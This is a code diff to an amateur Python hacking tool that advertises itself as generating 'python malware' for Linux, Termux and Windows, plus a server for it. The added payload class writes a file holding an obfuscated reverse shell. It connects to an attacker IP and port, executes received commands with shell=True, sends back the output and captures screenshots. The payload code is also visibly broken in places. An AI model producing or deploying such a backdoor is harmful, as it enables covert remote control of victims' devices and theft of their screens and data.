@@ -21,16 +21,15 @@ from tqdm import *
 
 def help_menu():
     print(f"    {r} commands                    {c} description                                                   {g}example")
-    print(f"    {y}   help          {g}>>{r}   [{v}                 it will show this help menu                         {r}]")
-    print(f"    {y}   clear         {g}>>{r}   [{v}                  it will clear the terminal                         {r}]")
-    print(f"    {y}   exit          {g}>>{r}   [{v}                   use it to exit the tool                           {r}]")
-    print(f"    {y}   usage         {g}>>{r}   [{v}       it will show how you can the commands of te toll              {r}]{y}            usage {g}<start server>{g}")
-    print(f"    {y}   update        {g}>>{r}   [{v}                 it will update the toll                        	{r}]")
-    print(f"    {y}   get status    {g}>>{r}   [{v}   it will check if you are connected to the internet ro not 	{r}]")
-    print(f"    {y}  exploit-payload{g}>>{r}   [{v}              it will creat a python malware                    	{r}]{y}            exploit-payload {g}<Linux , Termux , Windows>{none} ")
-    print(f"    {y}   start server  {g}>>{r}   [{v}          it will start a server for the malware                	{r}]")
-    print(f"    {y}   cre_channel   {g}>>{r}   [{v} 	it will show you the creator of this tool channels        	{r}]{y}            cre_channel {r}-c {g}<Github , Youtube , Facebook>{r} -o {g} <Termux , Linux , Windows , Mac>")
-    print(f"    {y}   show payload  {g}>>{r}   [{v} it will show you all the available paylaod that you can creat       {r}]{y}            ")
+    print(f"    {y}   help          {g}>>{r}   [{v}                 it will show this help menu                             {r}]")
+    print(f"    {y}   clear         {g}>>{r}   [{v}                  it will clear the terminal                             {r}]")
+    print(f"    {y}   exit          {g}>>{r}   [{v}                   use it to exit the tool                               {r}]")
+    print(f"    {y}   usage         {g}>>{r}   [{v}       it will show how you can the commands of te toll                  {r}]{y}            usage {g}<start server>{g}")
+    print(f"    {y}   update        {g}>>{r}   [{v}                 it will update the toll                        	    {r}]")
+    print(f"    {y}   get status    {g}>>{r}   [{v}   it will check if you are connected to the internet ro not 	    {r}]")
+    print(f"    {y}  exploit-payload{g}>>{r}   [{v}              it will creat a python malware                    	    {r}]{y}            exploit-payload {g}<Linux , Termux , Windows>{none} ")
+    print(f"    {y}   start server  {g}>>{r}   [{v}          it will start a server for the malware                	    {r}]")
+    print(f"    {y}   cre_channel   {g}>>{r}   [{v} 	it will show you the creator of this tool channels        	    {r}]{y}            cre_channel {r}-c {g}<Github , Youtube , Facebook>")
 
 '''making the cre_channel option'''
 class channel:
@@ -45,13 +44,13 @@ class channel:
                 try:
                     os.system("xdg-open https://github.com/said-technologie")
                 except:
-                    pass
+                    os.system("termux-open https://github.com/said-technologie")
         def facebook_T_L():
             if platform.system == "Linux":
                 try:
                     os.system("xdg-open https://www.facebook.com/Said_technologie-111339843954624")
                 except:
-                    pass
+                    os.system("termux-open https://www.facebook.com/Said_technologie-111339843954624")
 
 '''cheking the status of thes user'''
 
@@ -113,52 +112,62 @@ class usage:
         print(f"        {v}Usage {g}cre_channel {r}:{none}")
         print(f"            {v} this command {r}'{g}cre_channel{r}'{v} will alaws you to see all my channls and even open it on a browser{v}{none}")
         print(f"                             {g}please {y}subscribe{g} to my {y} Youtube{g} channel")
-        print(f"        {y} Example {g}for Linux{r}:{none}")
+        print(f"        {y} Example :{none}")
         print(f"             {c} input{r} :{none}")
         print(f"                    {y}1{r}-{v} Youtube{none}")
-        print(f"                          {g}cre_channel -c Youtube -o Linux")
+        print(f"                          {g}cre_channel -c Youtube")
         print(f"                    {y}2{r}-{v} Github{none}")
-        print(f"                          {g}cre_channel -c Github -o Linux")
+        print(f"                          {g}cre_channel -c Github")
         print(f"                    {y}3{r}-{v} Facebook{none}")
-        print(f"                          {g}cre_channel -c Facebook -o Linux")
-        print(f"        {y} Example {g}for Termux{r}:{none}")
-        print(f"             {c} input{r} :{none}")
-        print(f"                    {y}1{r}-{v} Youtube{none}")
-        print(f"                          {g}cre_channel -c Youtube -o Termux")
-        print(f"                    {y}2{r}-{v} Github{none}")
-        print(f"                          {g}cre_channel -c Github -o Termux")
-        print(f"                    {y}3{r}-{v} Facebook{none}")
-        print(f"                          {g}cre_channel -c Facebook -o Termux")
-        print(f"        {y} Example {g}for Windows{r}:{none}")
-        print(f"             {c} input{r} :{none}")
-        print(f"                    {y}1{r}-{v} Youtube{none}")
-        print(f"                          {g}cre_channel -c Youtube -o Windows")
-        print(f"                    {y}2{r}-{v} Github{none}")
-        print(f"                          {g}cre_channel -c Github -o Windows")
-        print(f"                    {y}3{r}-{v} Facebook{none}")
-        print(f"                          {g}cre_channel -c Facebook -o Windows")
-        print(f"        {y} Example {g}for Mac{r}:{none}")
-        print(f"             {c} input{r} :{none}")
-        print(f"                    {y}1{r}-{v} Youtube{none}")
-        print(f"                          {g}cre_channel -c Youtube -o Mac")
-        print(f"                    {y}2{r}-{v} Github{none}")
-        print(f"                          {g}cre_channel -c Github -o Mac")
-        print(f"                    {y}3{r}-{v} Facebook{none}")
-        print(f"                          {g}cre_channel -c Facebook -o Mac")
+        print(f"                          {g}cre_channel -c Facebook")
         print(f"             {c} output{r} :{none}")
         print(f"                         {v}it will open my {y}channels")
 
 '''making a python payload that alaws the hacker to make a connection with his victim'''
 class payload:
     def Termux(op_intarface):
-        if op_intarface[2] == "screenshot_send_rsv":
-            payload_screenshot = open(f"payload/Termux/{op_intarface[4]}.py", "wb")
-            paylaod_write = payload_screenshot.write("")
-            progress = tqdm.tqdm(range(1000), f"{y}Generating payload {r}", unit="B", unit_scale=True, unit_divisor=1024)
-            progress.update(len(paylaod_write))
-            print(f"  {c}[{g}+{c}] {g}Done")
-            print(f"  {c}[{g}!{c}] {y}paylaod saved to {r}paylaod{v}/{r}Termux{v}/{r}{op_intarface[4]}.py")
-
+        #if op_intarface[2:] == "Termux":
+        payload_screenshot = open(f"payload/Termux/hello.py", "x")
+        paylaod_write = payload_screenshot.write("import sys , os ,time\n",
+            "try:\n",
+            "   import pyautogui\n",
+            "    import tqdm\n",
+            "except:\n",
+            "   os.system('pip install subprocess > install.txt')\n",
+            "   os.system('pip install pyautogui > install.txt')\n",
+            "   os.system('pip install tqdm > install.txt')\n",
+            "   os.system('rm install.txt')v",
+            "   import subprocess\n",
+            "   import pyautoguiv",
+            "   import tqdm\n",
+            "import socket\n",
+            "bASYUAusU = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n",
+            "PLppsokPSO = '192.168.1.41'\n",
+            "OIWODFISO = 5050\n",
+            "PPJAjpA = '<SEPARATOR>'\n",
+            "bASYUAusU.connect((PLppsokPSO ,OIWODFISO))\n",
+            "def yyyyyyyyyyYyySSAASKJAKSAS():\n",
+            "    while True:\n",
+            "        OASASASONon = bASYUAusU.recv(1024)\n",
+            "        if OASASASONon[0:] == 'cd':\n",
+            "            os.chdir(OASASASONon[2:].encode('utf-8'))\n",
+            "        elif OASASASONon[0:] == 'screenshot':\n",
+            "            for i in range(OASASASONon[2].encode('utf-8')):\n",
+            "                OUauaoxuu = pyautogui.screenshot()\n",
+            "                OIioiaoIX = OUauaoxuu.save(f'target{i}.png')\n",
+            "                jNOsiauiays = os.path.getsize(OIioiaoIX)\n",
+            "                bASYUAusU.send(f'{OIioiaoIX}{PPJAjpA}{jNOsiauiays}'.encode('utf-8'))\n",
+            "        if len(OASASASONon) > 0:\n",
+            "            oCDISDCICjnkjn = subprocess.Popen(OASASASONon[:].encode('utf-8'), shell=True, stdout=subprocess.PIPE ,stderr=subprocess.PIPE,stdin=subprocess.PIPE)\n",
+            "            kjaxnajkbc = oCDISDCICjnkjn.stdout.read() + oCDISDCICjnkjn.stderr.read()\n",
+            "            MolLknKN = str(kjaxnajkbc,'utf-8')\n",
+            "            bASYUAusU.send(str.encode(MolLknKN))\n",
+            "    bASYUAusU.close()\n",
+            "yyyyyyyyyyYyySSAASKJAKSAS()")
+        progress = tqdm.tqdm(range(1000), f"{y}Generating payload {r}", unit="B", unit_scale=True, unit_divisor=1024)
+        progress.update(len(paylaod_write))
+        print(f"  {c}[{g}+{c}] {g}Done")
+        print(f"  {c}[{g}!{c}] {y}paylaod saved to {r}paylaod{v}/{r}Termux{v}/{r}{op_intarface[4]}.py")
 
 '''
 def start_srver():
